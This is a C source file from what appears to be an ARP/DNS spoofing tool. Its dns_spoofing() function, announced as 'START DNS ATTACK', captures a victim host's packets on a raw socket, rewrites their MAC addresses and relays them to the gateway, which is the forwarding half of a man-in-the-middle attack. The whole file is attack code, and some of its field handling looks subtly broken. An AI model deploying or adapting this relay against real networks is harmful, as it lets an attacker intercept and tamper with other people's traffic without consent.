#include "dnsspoof.h"
#include "arpspoof.h"
#include <netinet/ip.h>
#include <netinet/udp.h>
int compare_mac(uint8_t* mac_1, uint8_t* mac_2){
    int i;
    for(i = 0; i< ETH_ALEN; i++)
        if(*(mac_1+i) != *(mac_2+i))
            return 0;
    return 1;
}
int compare_ip(uint8_t* ip_1, uint8_t* ip_2){
    int i;
    for(i = 0; i< 4; i++)
        if(*(ip_1+i) != *(ip_2+i))
            return 0;
    return 1;
}
void pac_status(uint8_t* pac){
    struct ether_header *eth_hdr = (struct ether_header*) pac;
    struct iphdr *ip_hdr = (struct iphdr*) (pac + sizeof(struct ether_header));
    struct udphdr *udp_hdr;
    struct dnshdr *dns_hdr;
    fprintf(stderr, "Dest MAC: %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n", *eth_hdr->ether_dhost, *(eth_hdr->ether_dhost+1), *(eth_hdr->ether_dhost+2), *(eth_hdr->ether_dhost+3), *(eth_hdr->ether_dhost+4), *(eth_hdr->ether_dhost+5));
    fprintf(stderr, "Src MAC: %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n", *eth_hdr->ether_shost, *(eth_hdr->ether_shost+1), *(eth_hdr->ether_shost+2), *(eth_hdr->ether_shost+3), *(eth_hdr->ether_shost+4), *(eth_hdr->ether_shost+5));
    fprintf(stderr, "Ether Type: 0x%.4x\n", ntohs(eth_hdr->ether_type));
    fprintf(stderr, "Src IP: %d.%d.%d.%d\n", *ip_hdr->saddr, *(ip_hdr->saddr+1), *(ip_hdr->saddr+2), *(ip_hdr->saddr+3));
    fprintf(stderr, "Dest IP: %d.%d.%d.%d\n", *ip_hdr->daddr, *(ip_hdr->daddr+1), *(ip_hdr->daddr+2), *(ip_hdr->daddr+3));
    fprintf(stderr, "Protocol: 0x%.4x\n\n", ntohs(ip_hdr->protocol));
}
void modify_pac(uint8_t *ip_pac, uint8_t* sha, uint8_t* tha){
    struct ether_header *eth_hdr = (struct ether_header*) ip_pac;
    int i;
    for(i = 0;i<ETH_ALEN;i++){
        eth_hdr->ether_shost[i] = *(sha+i);
        eth_hdr->ether_dhost[i] = *(tha+i);
    }
}
void* dns_spoofing(void* args){
    fprintf(stderr, "\nSTART DNS ATTACK\n");
    int sock_ip = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
    if(sock_ip < 0){
        fprintf(stderr, "Error in creating IP socket\n");
        exit(0);
    }
    attacking_args_t *argument = (attacking_args_t*) args;
    uint8_t* ip_pac = malloc(IP_PACKET_LEN);

    memset(ip_pac, 0 , IP_PACKET_LEN);
    struct ether_header *eth_hdr = (struct ether_header*) ip_pac;
    struct iphdr *ip_hdr = (struct iphdr*) (ip_pac + sizeof(struct ether_header));
    struct udphdr *udp_hdr;
    struct dnshdr *dns_hdr;
    int byte_recv;
    int i;
    while(1){
        byte_recv = recvfrom(sock_ip, ip_pac, IP_PACKET_LEN, 0, NULL, NULL);
        if(byte_recv>0){
            if(compare_mac(eth_hdr->ether_dhost, argument->my_mac) && compare_ip(ip_hdr->saddr, argument->target_ip) && !compare_ip(ip_hdr->daddr, argument->my_ip)){
                printf("_________________________________\n");
                for(i =0; i<byte_recv;i++)
                    printf("%.2x ", *(ip_pac+i));
                    printf("\n");
                pac_status(ip_pac);
                modify_pac(ip_pac, argument->my_mac, argument->gateway_mac);
                if(!sendto(sock_ip, ip_pac, byte_recv, 0, (struct sockaddr*) &(argument->socket_address), argument->addr_len))
                    fprintf(stderr, "Error in forwading\n");
                else
                    fprintf(stderr, "Forwaded packet\n");
                
            }
        }
    }
    
}